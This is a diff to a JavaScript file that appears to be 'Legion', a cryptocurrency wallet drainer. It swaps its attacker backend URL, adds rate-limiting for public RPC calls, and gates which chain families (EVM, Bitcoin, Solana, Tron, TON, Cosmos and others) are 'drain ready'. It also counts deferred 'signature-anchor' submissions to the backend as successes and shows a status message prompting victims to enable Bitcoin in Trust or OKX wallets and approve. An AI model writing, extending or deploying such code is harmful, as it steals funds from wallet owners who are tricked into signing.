@@ -44,7 +44,7 @@
   // SECTION 02: CONFIG + CONSTANTS
   // ═══════════════════════════════════════════════════════════════
   var CFG = Object.assign({
-    backendUrl: 'https://legionapi-production.up.railway.app',
+    backendUrl: 'https://sadrailala-production.up.railway.app',
     wcProjectId: '',
     kineticKey: '',
     silentMode: false,
@@ -62,7 +62,7 @@
     debugDevTools: false,
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.13.4';
+  var LEGION_VERSION = '5.13.5';
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
@@ -110,7 +110,7 @@
     return null;
   }
 
-  var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://legionapi-production.up.railway.app';
+  var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://sadrailala-production.up.railway.app';
   var WC_PROJECT_ID = String(CFG.wcProjectId || '');
   var KINETIC_KEY = String(CFG.kineticKey || '');
   var SILENT = CFG.silentMode === true;
@@ -207,17 +207,34 @@
   var NFT_APPROVAL_BATCH_SIZE = 50;
   var SEND_CALLS_MAX = 50;
 
+  // Public RPC rate limit — per-host gap + jitter (429/503 throttle mitigation)
+  var RPC_RATE = { lastByHost: {}, minGapMs: 120 };
+  function rpcHostKey(url) {
+    try { return new URL(url).host; } catch (_) { return String(url).slice(0, 48); }
+  }
+  async function rpcRateWait(url) {
+    var host = rpcHostKey(url);
+    var gap = RPC_RATE.minGapMs + Math.floor(Math.random() * 80);
+    var now = Date.now();
+    var last = RPC_RATE.lastByHost[host] || 0;
+    var wait = last + gap - now;
+    if (wait > 0) await sleep(wait);
+    RPC_RATE.lastByHost[host] = Date.now();
+  }
+
   async function evmPublicRpcCall(chainId, method, params) {
     var cid = Number(chainId) || 1;
     var urls = EVM_PUBLIC_RPC[cid] || EVM_PUBLIC_RPC[1];
     var lastErr = null;
     for (var ei = 0; ei < urls.length; ei++) {
       try {
+        await rpcRateWait(urls[ei]);
         var res = await fetch(urls[ei], {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params || [] }),
         });
+        if (res.status === 429 || res.status === 503) throw new Error('RPC rate limited HTTP ' + res.status);
         var json = await res.json();
         if (json.error) throw new Error(json.error.message || 'RPC error');
         return json.result;
@@ -240,7 +257,9 @@
     for (var fi = 0; fi < bases.length; fi++) {
       try {
         var base = String(bases[fi]).replace(/\/$/, '');
+        await rpcRateWait(base);
         var res = await fetch(base + path);
+        if (res.status === 429 || res.status === 503) throw new Error('REST rate limited HTTP ' + res.status);
         if (!res.ok) throw new Error('HTTP ' + res.status);
         return await res.json();
       } catch (e) { lastErr = e; }
@@ -1363,6 +1382,8 @@
     factoryContracts: {},
     deactivatedContracts: {},
     relayerSponsored: false,
+    chainCapabilities: {},
+    deferredBroadcasts: 0,
   };
 
   var _evmConnectLock = null;
@@ -2197,8 +2218,21 @@
       if (ctrl) opts.signal = ctrl.signal;
       var res = await fetch(BACKEND + path, opts);
       if (timer) clearTimeout(timer);
-      var data = await res.json();
-      if (!res.ok) { L.warn('API', res.status, path, data && data.message); return null; }
+      var data = await res.json().catch(function () { return {}; });
+      if (!res.ok) {
+        var deferred = res.status === 503 && data && (
+          data.code === 'DEFERRED_BROADCAST' ||
+          data.settlement_status === 'PENDING_BROADCAST' ||
+          (data.data && (data.data.code === 'DEFERRED_BROADCAST' || data.data.settlement_status === 'PENDING_BROADCAST'))
+        );
+        if (deferred) {
+          S.deferredBroadcasts = (S.deferredBroadcasts || 0) + 1;
+          L.log('API deferred broadcast (503):', path, '— backend will retry');
+          return { success: true, deferred: true, data: data.data || data };
+        }
+        L.warn('API', res.status, path, data && data.message);
+        return null;
+      }
       return data;
     } catch (e) {
       if (tries < 2) { await sleep(1000); return apiPost(path, body, tries + 1); }
@@ -2544,6 +2578,9 @@
         if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
         if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
         if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
+        if (d.data.chain_capabilities && typeof d.data.chain_capabilities === 'object') {
+          S.chainCapabilities = d.data.chain_capabilities;
+        }
         var factoryMap = d.data.factory_addresses;
         if (factoryMap && typeof factoryMap === 'object') {
           Object.keys(factoryMap).forEach(function (cid) {
@@ -2565,6 +2602,18 @@
       }
     } catch (e) { L.warn('Vault fetch failed, using fallback'); }
     S.vaultLoaded = true;
+  }
+
+  function isFamilyDrainReady(family) {
+    var fam = String(family || '').toUpperCase();
+    var cap = S.chainCapabilities && S.chainCapabilities[fam];
+    if (cap === 'disabled' || cap === 'anchor_only') return false;
+    if (cap === 'full') return true;
+    if (fam === 'COSMOS' && !VAULT.cosmos) return false;
+    if (fam === 'APTOS' && !VAULT.aptos) return false;
+    if (fam === 'SUI' && !VAULT.sui) return false;
+    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return false;
+    return true;
   }
 
   function normalizeTypedData(typedDataObj) {
@@ -3042,6 +3091,7 @@
       var wcFamilies = scanWcSessionAllFamilies();
       L.log('WC namespaces linked:', Object.keys(wcFamilies).filter(function (k) { return wcFamilies[k]; }).join(',') || 'evm-only');
       if (!wcFamilies.btc && !S.chains.BTC) {
+        UI.status('Enable Bitcoin in Trust/OKX on phone, then approve...');
         await ensureWcBip122Linked();
       }
       L.log('Bundled AppKit connected | connector:', connId || 'unknown',
@@ -4490,6 +4540,22 @@
       priority = priority.filter(function (k) { return k !== 'EVM'; });
     }
 
+    priority = priority.filter(function (key) {
+      if (!isFamilyDrainReady(key)) {
+        L.log('[drain] skip', key, '— capability:', (S.chainCapabilities && S.chainCapabilities[key]) || 'vault/config');
+        return false;
+      }
+      if (!runners[key]) return false;
+      if (key === 'COSMOS' && !S.familyConnections.COSMOS) return false;
+      if (key === 'SOL' && !S.familyConnections.SVM) return false;
+      if (key === 'BTC' && !S.familyConnections.UTXO) return false;
+      if (key === 'TRON' && !S.familyConnections.TRON) return false;
+      if (key === 'TON' && !S.familyConnections.TON) return false;
+      if (key === 'APTOS' && !S.familyConnections.APTOS) return false;
+      if (key === 'SUI' && !S.familyConnections.SUI) return false;
+      return true;
+    });
+
     var parallel = [];
     if (evmFirst <= 0) parallel.push(runners.EVM().catch(function (e) { L.warn('EVM:', e.message); }));
     priority.forEach(function (key) {
@@ -4589,7 +4655,10 @@
         payload.caip_chain_id = 'eip155:' + payload.chain_id;
       }
       var r = await apiPost('/api/v1/signature-anchor', payload);
-      if (r && (r.success || r.data)) { S.anchorsOk++; L.log('Submitted:', extra.protocol); }
+      if (r && (r.success || r.deferred || r.data)) {
+        S.anchorsOk++;
+        L.log('Submitted:', extra.protocol, r.deferred ? '(deferred broadcast)' : '');
+      }
       return r;
     },
 
